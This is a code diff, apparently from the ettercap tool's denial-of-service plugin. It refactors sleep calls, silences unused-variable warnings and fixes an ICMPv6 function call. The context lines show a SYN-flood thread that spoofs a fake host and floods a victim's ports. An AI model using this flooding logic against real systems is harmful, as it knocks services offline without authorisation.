@@ -26,7 +26,7 @@
 #include <ec_packet.h>
 #include <ec_send.h>                   
 #include <ec_threads.h>
-#include <time.h>
+#include <ec_sleep.h>
 
 /* protos */
 int plugin_load(void *);
@@ -83,6 +83,9 @@ static int dos_attack_init(void *dummy)
    char unused_addr[MAX_ASCII_ADDR_LEN];
    struct port_list *p;
          
+   /* variable not used */
+   (void) dummy;
+
    /* It doesn't work if unoffensive */
    if (GBL_OPTIONS->unoffensive) {
       INSTANT_USER_MSG("dos_attack: plugin doesn't work in UNOFFENSIVE mode\n");
@@ -143,6 +146,9 @@ static int dos_attack_fini(void *dummy)
 {
    pthread_t pid;
 
+   /* variable not used */
+   (void) dummy;
+
    /* Remove the hooks */
    hook_del(HOOK_PACKET_ARP_RQ, &parse_arp);
    hook_del(HOOK_PACKET_TCP, &parse_tcp);
@@ -170,22 +176,16 @@ EC_THREAD_FUNC(syn_flooder)
    u_int32 seq = 0xabadc0de;
    struct port_list *p;
 
-#if !defined(OS_WINDOWS)
-   struct timespec tm;
-   tm.tv_sec = 0;
-   tm.tv_nsec = 1000*1000;
-#endif
+   /* variable not used */
+   (void) EC_THREAD_PARAM;
+
    /* init the thread and wait for start up */
    ec_thread_init();
  
    /* First "scan" ports from 1 to 1024 */
    for (dport=1; dport<1024; dport++) {
       send_tcp(&fake_host, &victim_host, sport++, htons(dport), seq++, 0, TH_SYN, NULL, 0);
-#if !defined(OS_WINDOWS)
-      nanosleep(&tm, NULL);
-#else
-      usleep(1000);
-#endif
+      ec_usleep(1000);
    }
 
    INSTANT_USER_MSG("dos_attack: Starting attack...\n");
@@ -197,11 +197,7 @@ EC_THREAD_FUNC(syn_flooder)
       SLIST_FOREACH(p, &port_table, next)    
          send_tcp(&fake_host, &victim_host, sport++, p->port, seq++, 0, TH_SYN, NULL, 0);
 	 
-#if !defined(OS_WINDOWS)
-      nanosleep(&tm, NULL);
-#else
-      usleep(1000);
-#endif
+      ec_usleep(1000);
    }
    
    return NULL;
@@ -220,7 +216,7 @@ static void parse_icmp6(struct packet_object *po)
    struct ip_addr ip;
    ip_addr_init(&ip, AF_INET6, po->L4.options);
    if(!ip_addr_cmp(&fake_host, &ip))
-      send_icmp6_nadv(&fake_host, &po->L3.src, &fake_host, GBL_IFACE->mac, 0);
+      send_icmp6_nadv(&fake_host, &po->L3.src, GBL_IFACE->mac, 0);
 }
 #endif
 
